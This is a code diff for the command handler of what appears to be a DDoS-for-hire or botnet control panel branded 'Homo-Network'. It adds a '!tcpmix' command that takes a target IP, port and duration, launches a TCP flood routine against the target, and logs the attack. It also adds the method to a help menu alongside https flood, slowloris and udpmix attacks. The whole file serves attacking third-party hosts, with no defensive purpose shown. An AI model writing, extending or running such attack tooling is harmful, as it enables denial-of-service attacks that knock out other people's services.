@@ -114,6 +114,21 @@ func CommandManager(conn net.Conn) {
 		fmt.Println(color.GreenString("\n[!] New attack\nTarget: " + cmd[1] + "\nLogin: " + s.Login + "\nIP: " + s.Ip))
 		Print(gradient.Rainbow().Apply("[Homo-Network] ")+color.HiWhiteString("Command successfully sent\n"), conn)
 
+	} else if strings.HasPrefix(string(line), "!tcpmix") {
+		cmd := strings.Split(string(line), " ")
+		fmt.Println(cmd)
+
+		if len(cmd) < 3 {
+			CommandError("!tcpmix <TARGET> <PORT> <DURATION>\n", "!tcpmix 1.1.1.1 1093 60\n", conn)
+		}
+		if len(cmd) > 4 {
+			CommandError("!tcpmix <TARGET> <PORT> <DURATION>\n", "!tcpmix 1.1.1.1 1093 60\n", conn)
+		}
+
+		go server.Tcpmix(cmd[1], cmd[3], cmd[2])
+		Log("🚀 New attack||Target: " + cmd[1] + "||Login: " + s.Login + "||IP: " + s.Ip + "*")
+		fmt.Println(color.GreenString("\n[!] New attack\nTarget: " + cmd[1] + "\nLogin: " + s.Login + "\nIP: " + s.Ip))
+		Print(gradient.Rainbow().Apply("[Homo-Network] ")+color.HiWhiteString("Command successfully sent\n"), conn)
 	} else if strings.HasPrefix(string(line), "help") || strings.HasPrefix(string(line), "methods") {
 
 		conn.Write([]byte("\n"))
@@ -121,6 +136,7 @@ func CommandManager(conn net.Conn) {
 		conn.Write([]byte(color.HiWhiteString("!https: Basic https flood\t\t| Type: L7\n")))
 		conn.Write([]byte(color.HiWhiteString("!slowloris: Slowloris method\t\t| Type: L7\n")))
 		conn.Write([]byte(color.HiWhiteString("!udpmix: Udp mix method\t\t\t| Type: L4\n")))
+		conn.Write([]byte(color.HiWhiteString("!tcpmix: Tcp mix method\t\t\t| Type: L4\n")))
 
 		conn.Write([]byte("\n"))
 
